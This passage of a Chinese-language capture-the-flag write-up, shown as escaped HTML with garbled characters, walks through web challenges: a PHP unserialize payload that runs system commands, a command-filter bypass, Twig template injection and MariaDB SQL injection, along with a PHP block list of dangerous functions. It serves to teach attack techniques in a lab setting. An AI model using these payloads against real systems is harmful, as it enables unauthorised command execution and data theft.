class=&#34;hljs-variable&#34;&gt;%a2&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%00&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%a8&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%28&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%4&lt;/span&gt;b&lt;span class=&#34;hljs-variable&#34;&gt;%f3&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%6&lt;/span&gt;e&lt;span class=&#34;hljs-variable&#34;&gt;%8&lt;/span&gt;e&lt;span class=&#34;hljs-variable&#34;&gt;%4&lt;/span&gt;b&lt;span class=&#34;hljs-variable&#34;&gt;%55&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%b3&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%5&lt;/span&gt;f&lt;span class=&#34;hljs-variable&#34;&gt;%42&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%75&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%93&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%d8&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%49&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%67&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%6&lt;/span&gt;d&lt;span class=&#34;hljs-variable&#34;&gt;%a0&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%d1&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%55&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%5&lt;/span&gt;d&lt;span class=&#34;hljs-variable&#34;&gt;%83&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%60&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%fb&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%5&lt;/span&gt;f&lt;span class=&#34;hljs-variable&#34;&gt;%07&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%fe&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%a2&lt;/span&gt;&amp;amp;b&lt;span class=&#34;hljs-operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%4&lt;/span&gt;d&lt;span class=&#34;hljs-variable&#34;&gt;%c9&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%68&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%ff&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%0&lt;/span&gt;e&lt;span class=&#34;hljs-variable&#34;&gt;%e3&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%5&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%20&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%95&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%72&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%d4&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%77&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%7&lt;/span&gt;b&lt;span class=&#34;hljs-variable&#34;&gt;%72&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%15&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%87&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%d3&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%6&lt;/span&gt;f&lt;span class=&#34;hljs-variable&#34;&gt;%a7&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%b2&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%1&lt;/span&gt;b&lt;span class=&#34;hljs-variable&#34;&gt;%dc&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%56&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%b7&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%4&lt;/span&gt;a&lt;span class=&#34;hljs-variable&#34;&gt;%3&lt;/span&gt;d&lt;span class=&#34;hljs-variable&#34;&gt;%c0&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%78&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%3&lt;/span&gt;e&lt;span class=&#34;hljs-variable&#34;&gt;%7&lt;/span&gt;b&lt;span class=&#34;hljs-variable&#34;&gt;%95&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%18&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%af&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%bf&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%a2&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%02&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%a8&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%28&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%4&lt;/span&gt;b&lt;span class=&#34;hljs-variable&#34;&gt;%f3&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%6&lt;/span&gt;e&lt;span class=&#34;hljs-variable&#34;&gt;%8&lt;/span&gt;e&lt;span class=&#34;hljs-variable&#34;&gt;%4&lt;/span&gt;b&lt;span class=&#34;hljs-variable&#34;&gt;%55&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%b3&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%5&lt;/span&gt;f&lt;span class=&#34;hljs-variable&#34;&gt;%42&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%75&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%93&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%d8&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%49&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%67&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%6&lt;/span&gt;d&lt;span class=&#34;hljs-variable&#34;&gt;%a0&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%d1&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%d5&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%5&lt;/span&gt;d&lt;span class=&#34;hljs-variable&#34;&gt;%83&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%60&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%fb&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%5&lt;/span&gt;f&lt;span class=&#34;hljs-variable&#34;&gt;%07&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%fe&lt;/span&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%a2&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;æ¥ç»•è¿‡&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;$cmdè¿‡æ»¤äº†ä¸€äº›å­—ç¬¦ï¼Œç›´æ¥&lt;code&gt;ca\t+/flag&lt;/code&gt;ç»•è¿‡æ‹¿åˆ°flag&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb&#34;&gt;&lt;a href=&#34;#ç½‘é¼æ¯-2020-æœ±é›€ç»„-phpweb&#34; class=&#34;headerlink&#34; title=&#34;[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb&#34;&gt;&lt;/a&gt;[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;æŸ¥çœ‹æºä»£ç å‘ç°æœ‰éšè—è¡¨å•ï¼Œå‘é€dataå’Œæ—¶é—´ï¼Œå¯èƒ½å­˜åœ¨å‘½ä»¤æ‰§è¡Œ&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;evalã€systemç­‰å‡½æ•°ä¼šè¢«æ£€æµ‹ï¼Œäºæ˜¯å…ˆfile_get_contentsè¯»ä¸€ä¸‹index.php:&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt; &lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-variable&#34;&gt;$disable_fun&lt;/span&gt; = &lt;span class=&#34;hljs-keyword&#34;&gt;array&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;exec&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;shell_exec&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;system&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;passthru&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;proc_open&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;show_source&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;phpinfo&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;popen&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;dl&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;eval&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;proc_terminate&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;touch&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;escapeshellcmd&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;escapeshellarg&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;assert&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;substr_replace&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;call_user_func_array&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;call_user_func&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;array_filter&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;array_walk&amp;quot;&lt;/span&gt;,  &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;array_map&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;registregister_shutdown_function&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;register_tick_function&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;filter_var&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;filter_var_array&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;uasort&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;uksort&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;array_reduce&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;array_walk&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;array_walk_recursive&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;pcntl_exec&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;fopen&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;fwrite&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;file_put_contents&amp;quot;&lt;/span&gt;);&lt;br&gt;    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;gettime&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$func&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$p&lt;/span&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$result&lt;/span&gt; = call_user_func(&lt;span class=&#34;hljs-variable&#34;&gt;$func&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$p&lt;/span&gt;);&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$a&lt;/span&gt;= gettype(&lt;span class=&#34;hljs-variable&#34;&gt;$result&lt;/span&gt;);&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;hljs-variable&#34;&gt;$a&lt;/span&gt; == &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;string&amp;quot;&lt;/span&gt;) &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$result&lt;/span&gt;;&lt;br&gt;        &amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;;&amp;#125;&lt;br&gt;    &amp;#125;&lt;br&gt;    &lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;Test&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$p&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Y-m-d h:i:s a&amp;quot;&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$func&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;date&amp;quot;&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;__destruct&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;func != &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;) &amp;#123;&lt;br&gt;                &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; gettime(&lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;func, &lt;span class=&#34;hljs-keyword&#34;&gt;$this&lt;/span&gt;-&amp;gt;p);&lt;br&gt;            &amp;#125;&lt;br&gt;        &amp;#125;&lt;br&gt;    &amp;#125;&lt;br&gt;    &lt;span class=&#34;hljs-variable&#34;&gt;$func&lt;/span&gt; = &lt;span class=&#34;hljs-variable&#34;&gt;$_REQUEST&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;func&amp;quot;&lt;/span&gt;];&lt;br&gt;    &lt;span class=&#34;hljs-variable&#34;&gt;$p&lt;/span&gt; = &lt;span class=&#34;hljs-variable&#34;&gt;$_REQUEST&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;p&amp;quot;&lt;/span&gt;];&lt;br&gt;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;hljs-variable&#34;&gt;$func&lt;/span&gt; != &lt;span class=&#34;hljs-literal&#34;&gt;null&lt;/span&gt;) &amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$func&lt;/span&gt; = strtolower(&lt;span class=&#34;hljs-variable&#34;&gt;$func&lt;/span&gt;);&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (!in_array(&lt;span class=&#34;hljs-variable&#34;&gt;$func&lt;/span&gt;,&lt;span class=&#34;hljs-variable&#34;&gt;$disable_fun&lt;/span&gt;)) &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; gettime(&lt;span class=&#34;hljs-variable&#34;&gt;$func&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$p&lt;/span&gt;);&lt;br&gt;        &amp;#125;&lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Hacker...&amp;quot;&lt;/span&gt;);&lt;br&gt;        &amp;#125;&lt;br&gt;    &amp;#125;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;å¯ä»¥çœ‹åˆ°ç¦ç”¨äº†ä¸€äº›å±é™©å‡½æ•°ï¼Œä½†æ˜¯é‡Œé¢æœ‰ä¸€ä¸ªTestç±»ï¼Œå¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œè€Œä¸”unserializeæ²¡æœ‰è¢«ç¦ç”¨ï¼Œå°±å¯ä»¥æ„é€ ååºåˆ—åŒ–æ¥å®ç°å‘½ä»¤æ‰§è¡Œã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;payloadï¼š&lt;code&gt;func=unserialize&amp;amp;p=O:4:&amp;quot;Test&amp;quot;:2:&amp;#123;s:1:&amp;quot;p&amp;quot;;s:22:&amp;quot;cat /tmp/flagoefiu4r93&amp;quot;;s:4:&amp;quot;func&amp;quot;;s:6:&amp;quot;system&amp;quot;;&amp;#125;&lt;/code&gt;æ‹¿åˆ°flag&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;BJDCTF2020-Cookie-is-so-stable&#34;&gt;&lt;a href=&#34;#BJDCTF2020-Cookie-is-so-stable&#34; class=&#34;headerlink&#34; title=&#34;[BJDCTF2020]Cookie is so stable&#34;&gt;&lt;/a&gt;[BJDCTF2020]Cookie is so stable&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;æç¤ºcookieï¼Œå‘ç°åœ¨flagè¾“å…¥idåcookieæœ‰ä¸€ä¸ªuserå­—æ®µå­˜åœ¨æ¨¡æ¿æ³¨å…¥ï¼Œæµ‹è¯•4æ˜¾ç¤ºHello 4&lt;/li&gt;
&lt;li&gt;å‘ç°å­˜åœ¨è¿‡æ»¤ï¼Œè¿‡æ»¤äº†:&lt;code&gt;()ã€&amp;#39;&amp;#39;ã€$&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;ç›´æ¥ç”¨Twigçš„payloadç›´æ¥cat flag&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;SWPU2019-Web1&#34;&gt;&lt;a href=&#34;#SWPU2019-Web1&#34; class=&#34;headerlink&#34; title=&#34;[SWPU2019]Web1&#34;&gt;&lt;/a&gt;[SWPU2019]Web1&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;åœ¨å¹¿å‘Šåå¤„æœ‰è¿‡æ»¤ï¼Œå¯èƒ½å­˜åœ¨æ³¨å…¥ç‚¹&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;æµ‹è¯•&lt;code&gt;&amp;#39;&lt;/code&gt;ç„¶åç‚¹å¹¿å‘Šè¯¦æƒ…ä¼šåŒ…é”™ï¼Œå­˜åœ¨æ³¨å…¥ç‚¹&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;æµ‹è¯•å­—æ®µæ•°ï¼Œä¸§å¿ƒç—…ç‹‚çš„æœ‰22ä¸ªå­—æ®µæ•°ã€‚ã€‚ã€‚ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;ç©ºæ ¼ç”¨&lt;code&gt;/**/&lt;/code&gt;ç»•è¿‡ï¼Œ(select/**/version())çœ‹åˆ°æ˜¯MariaDB&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&#34;https://blog.zeddyu.info/2019/03/06/Sqli%E5%A4%87%E5%BF%98%E5%BD%95/&#34;&gt;https://blog.zeddyu.info/2019/03/06/Sqli%E5%A4%87%E5%BF%98%E5%BD%95/&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;select distinct(table_name) from mysql.innodb_index_stats&lt;/code&gt;æ‹¿åˆ°è¡¨å&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;è¿‡æ»¤äº†or    æ— åˆ—åæ³¨å…¥&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;select group_concat(b) from (select 1,2,3 as b union select * from users)a&lt;/code&gt;æ‹¿flag&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;å®‰æ´µæ¯-2019-easy-serialize-php&#34;&gt;&lt;a href=&#34;#å®‰æ´µæ¯-2019-easy-serialize-php&#34; class=&#34;headerlink&#34; title=&#34;[å®‰æ´µæ¯ 2019]easy_serialize_php&#34;&gt;&lt;/a&gt;[å®‰æ´µæ¯ 2019]easy_serialize_php&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;ç»™å‡ºæºç ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt; &lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$function&lt;/span&gt; = @&lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;f&amp;#x27;&lt;/span&gt;];&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;filter&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span 